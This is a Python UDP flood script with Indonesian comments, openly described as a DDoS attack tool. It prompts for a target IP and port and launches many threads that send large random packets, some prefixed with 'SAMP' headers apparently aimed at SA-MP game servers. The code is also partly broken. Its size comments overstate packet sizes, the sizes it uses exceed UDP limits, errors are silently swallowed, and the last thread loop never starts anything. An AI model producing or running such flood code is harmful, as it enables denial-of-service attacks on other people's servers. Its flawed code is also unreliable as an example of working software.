import socket
import struct
import codecs
import threading
import random
import time

# Daftar payloads untuk serangan DDoS L4
payloads = [
    codecs.decode("53414d5090d91d4d611e700a465b00", "hex_codec"),  # p
    codecs.decode("53414d509538e1a9611e63", "hex_codec"),          # c
    codecs.decode("53414d509538e1a9611e69", "hex_codec"),          # i
    codecs.decode("53414d509538e1a9611e72", "hex_codec"),          # r
    codecs.decode("081e62da", "hex_codec"),                        # cookie port 7796
    codecs.decode("081e77da", "hex_codec"),                        # cookie port 7777
    codecs.decode("081e4dda", "hex_codec"),                        # cookie port 7771
    codecs.decode("021efd40", "hex_codec"),                        # cookie port 7784
    codecs.decode("021efd40", "hex_codec"),                        # cookie port 1111
    codecs.decode("081e7eda", "hex_codec"),                        # cookie port 1111 tambem
    codecs.decode("53414d50a3b17dd3311e8c", "hex_codec"),          # payload tambahan
    codecs.decode("053414d5098e1a96c11e63", "hex_codec"),          # payload tambahan
    codecs.decode("53414d509538e1a9611e6f", "hex_codec"),          # payload tambahan
    # Tambahkan lebih banyak payloads di sini jika diperlukan
]

ip = input("Masukkan IP target: ")
port = int(input("Masukkan PORT target: "))
times = int(input("Masukkan jumlah paket: "))
size = int(input("Masukkan jumlah utas: "))

print("[!] Menyerang {}:{} dengan {} paket dan {} utas".format(ip, port, times, size))

def send_packet():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (ip, port)
            data = random._urandom(random.randint(1024*128, 2048*128))  # Ukuran paket acak antara 128-256 MB
            for _ in range(times):
                s.sendto(data, addr)
                time.sleep(random.uniform(0.1, 0.5))  # Menambahkan jeda acak antara paket
        except:
            pass
        finally:
            s.close()

def send_big_packet():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (ip, port)
            data = random._urandom(random.randint(2048*128, 4096*128))  # Ukuran paket acak antara 256-512 MB
            for _ in range(times):
                s.sendto(data, addr)
                time.sleep(random.uniform(0.1, 0.5))  # Menambahkan jeda acak antara paket
        except:
            pass
        finally:
            s.close()

class MyThread(threading.Thread):
    def run(self):
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                pack = random.choice(payloads)  # Memilih payload secara acak
                data = random._urandom(random.randint(2048*128, 4096*128))  # Ukuran paket acak antara 256-512 MB
                sock.sendto(pack + data, (ip, port))  # Menggabungkan payload dan data
                time.sleep(random.uniform(0.1, 0.5))  # Menambahkan jeda acak antara paket
            except:
                pass
            finally:
                sock.close()

# Memulai utas untuk mengirim paket kecil
for _ in range(size):
    thread_small = threading.Thread(target=send_packet)
    thread_small.start()

# Memulai utas untuk mengirim paket besar
for _ in range(size):
    thread_big = threading.Thread(target=send_big_packet)
    thread_big.start()

# Memulai utas untuk mengirim paket khusus
for _ in range(size):
    thread_special = MyThread
